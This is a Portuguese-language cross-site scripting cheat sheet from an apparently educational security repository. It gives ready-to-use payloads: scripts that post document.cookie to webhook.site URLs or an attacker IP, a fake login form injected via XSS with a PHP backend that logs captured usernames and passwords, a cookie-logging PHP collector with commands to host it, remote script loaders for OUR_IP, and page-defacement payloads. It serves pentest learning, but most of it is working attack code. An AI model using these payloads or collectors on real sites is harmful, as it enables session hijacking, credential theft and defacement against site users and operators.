# XSS

Existem **três tipos principais** de vulnerabilidades XSS:

| Tipo                         | Descrição |
|-----------------------------|-----------|
| **Stored (Persistent) XSS** | O tipo mais crítico de XSS, ocorre quando a entrada do usuário é armazenada no banco de dados do back-end e, em seguida, exibida posteriormente (ex: postagens ou comentários). |
| **Reflected (Non-Persistent) XSS** | Ocorre quando a entrada do usuário é refletida imediatamente na página após ser processada pelo servidor, sem ser armazenada (ex: resultados de pesquisa ou mensagens de erro). |
| **DOM-based XSS** | Um tipo de XSS não persistente que acontece quando a entrada do usuário é manipulada diretamente pelo navegador, sem passar pelo servidor (ex: parâmetros de URL ou tags de âncora). |

### Exemplos simples de payloads:

```html
<script>alert(window.origin)</script>
<plaintext>
<script>print()</script>
<img src="" onerror=alert(window.origin)>
<html%0aonpoIntEreNtER+=+[8].find(confirm)//>
<details%09ontoGGle%09=%09[8].find(confirm)%0dx//>
/language?destination=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTUE9TRUQnKTwvc2NyaXB0Pg==
<img src=x onerror="fetch('https://webhook.site/de5d7883-a25c-41cd-beb6-113d2b50a605',{method:'POST',body:'cookie='+document.cookie})">
<script>fetch("https://webhook.site/8a54464b-651a-4ae5-9d09-d19711774bd1",{method:'POST',body:'cookie='+document.cookie});</script>
<img src="invalid" onerror="document.body.innerHTML+='<iframe src=https://emupedia.net/emupedia-game-doom1/asmjs/ width=500 height=400></iframe>'">

```
Ferramenta útil: [URL/HTML Decoder - Eric Meyer](https://meyerweb.com/eric/tools/dencoder/)

---

### ✳️ DOM-Based XSS - Source & Sink

Para compreender XSS baseado em DOM, é essencial entender os conceitos de:

* **Source**: Objeto JavaScript que recebe a entrada do usuário (ex: parâmetros de URL, campos de input).
* **Sink**: Função que escreve a entrada do usuário no DOM. Se não sanitizar corretamente, permite ataques XSS.

### Funções JavaScript comuns como *sink*:

* `document.write()`
* `element.innerHTML`
* `element.outerHTML`

### Funções jQuery vulneráveis:

* `add()`
* `after()`
* `append()`

---

### 🎣 XSS Phishing

Simulando um formulário de login falso via XSS (passar no parâmetro vulnerável):

```html
document.write('<h3>Please login to continue</h3><form id="urlform" action="http://172.17.173.25"><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form><script>document.getElementById("urlform").remove();</script> <!--

```
Backend para captura de credenciais no seu host (ex na sua maquina atacante, um arquivo: index.php):

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    fclose($file);
    header("Location: http://SERVER_IP/phishing/index.php");
    exit();
}
?>
```
Host local com servidor PHP:

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
nano index.php   # Cole o código acima
sudo php -S 0.0.0.0:80
```

---

### 🖥️ XSS Defacement
Altera o conteúdo visual da página:

```html
<script>document.body.style.background = "black"</script>
<script>document.title = "deface"</script>
<script>document.getElementsByTagName('body')[0].innerHTML = "Deface"</script>

<script>
document.getElementsByTagName('body')[0].innerHTML = `
  <center>
    <h1 style="color: black">Protect this site, fellas</h1>
    <p style="color: white">
      by <img src="https://i.imgflip.com/1gpstz.jpg" height="1000px">
    </p>
  </center>`;
</script>

#Payload 1
<script>
  document.body.innerHTML = 
    <center>
      <iframe title="Doom" width="1000" height="900" src="https://emupedia.net/emupedia-game-doom1/asmjs/"></iframe>
      <br><br><br><br>
    </center>
  ;
</script>

#Payload 2
<iframe title="Doom" width="500" height="400" src="https://emupedia.net/emupedia-game-doom1/asmjs/"></iframe>

#Payload 3
<img src="invalid" onerror="document.body.innerHTML+='<iframe src=https://emupedia.net/emupedia-game-doom1/asmjs/ width=500 height=400></iframe>'">
```

---

### 🍪 XSS Session Hijacking / Blind XSS

Backend para roubo de cookies (ex: index.php):

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $cookie) {
        $cookie = urldecode($cookie);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Host local para escuta:

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
nano index.php   # Cole o código acima
php -S 0.0.0.0:4444
```
Payloads de exfiltração:

```html
<script src="http://OUR_IP"></script>
'><script src="http://OUR_IP"></script>
"><script src="http://OUR_IP"></script>

javascript:eval('var a=document.createElement("script");a.src="http://OUR_IP";document.body.appendChild(a)')

<script>
function b(){eval(this.responseText)};
a = new XMLHttpRequest();
a.addEventListener("load", b);
a.open("GET", "//OUR_IP");
a.send();
</script>

<script>$.getScript("http://OUR_IP")</script>

"><script>new Image().src='http://10.10.15.190:8080/index.php?c='+document.cookie</script>
```

- falar ainda sobre dalfox e xss strike

# 🛡️ Disclaimer 

This repository was created **for educational and cybersecurity research purposes only**.  
The use of any information, scripts, or tools contained herein **is the sole responsibility of the user**.  
**I am not responsible for any misuse** or activity that violates local laws or third-party policies.


© [GSecurity]
